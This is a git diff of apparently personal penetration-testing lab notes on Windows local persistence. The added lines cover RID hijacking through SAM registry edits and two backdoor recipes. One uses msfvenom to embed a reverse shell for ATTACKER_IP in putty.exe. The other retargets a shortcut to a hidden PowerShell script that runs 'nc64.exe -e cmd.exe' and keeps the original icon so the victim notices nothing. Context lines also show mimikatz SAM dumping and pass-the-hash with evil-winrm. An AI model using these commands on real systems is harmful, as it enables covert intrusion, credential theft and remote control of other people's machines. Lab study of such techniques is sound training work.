@@ -465,6 +465,7 @@ token::elevate # simply put, this takes us from our administrative shell with hi
 lsadump::sam # list of password
 ```
 # Windows-Local-Persistence ✅
+
 ## Tampering With Unprivileged Accounts ✅
 
 ### Assign Group Memberships ✅
@@ -487,7 +488,6 @@ sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hiv
 ----------------------------------------------------------
 evil-winrm -i 10.10.233.240 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 ```
-
 ### Special Privileges and Security Descriptors ✅
 ```powershell
 0️⃣ secedit /export /cfg config.inf
@@ -502,17 +502,31 @@ evil-winrm -i 10.10.233.240 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 ```powershell
 0️⃣ wmic useraccount get name,sid # To find the assigned RIDs for any user
 1️⃣ PsExec64.exe -i -s regedit # To run Regedit as SYSTEM
-2️⃣ Go to "HKLM\SAM\SAM\Domains\Account\Users\" Path 
-3️⃣
-4️⃣
-5️⃣
-6️⃣
-7️⃣
-8️⃣
-9️⃣
-🔟
-
-
-
-
+2️⃣ Go to "HKLM\SAM\SAM\Domains\Account\Users\" Path # Find RID our "user" in "F" file (hex) like (1010 = 03 F2)
+Notice: the RID is stored using hex
+Notice: the RID is stored using little-endian notation, so its bytes appear reversed. like (1010 = F2 03)
+4️⃣ We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F4 01)
+5️⃣ Remote Desktop to our user
 ```
+## Backdooring Files ✅
+
+### Executable Files ✅
+```powershell
+0️⃣ Find and Download executable file in our target desktop 
+1️⃣ msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe # Add backdoor
+3️⃣ upload target Desktop
+```
+### Shortcut Files ✅
+```powershell
+0️⃣ find shortcut executable file in our target desktop
+1️⃣ Create a simple Powershell script in C:\Windows\System32 or any other sneaky location.
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+Start-Process -NoNewWindow "C:\Windows\System32\calc.exe"
+2️⃣ we'll change the shortcut to point to our script in shortcut > properties > change Path target 
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+3️⃣ Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user
+4️⃣ start an nc listener to receive our reverse shell on our attacker's machine
+nc -lvp 4445
+```
+
+
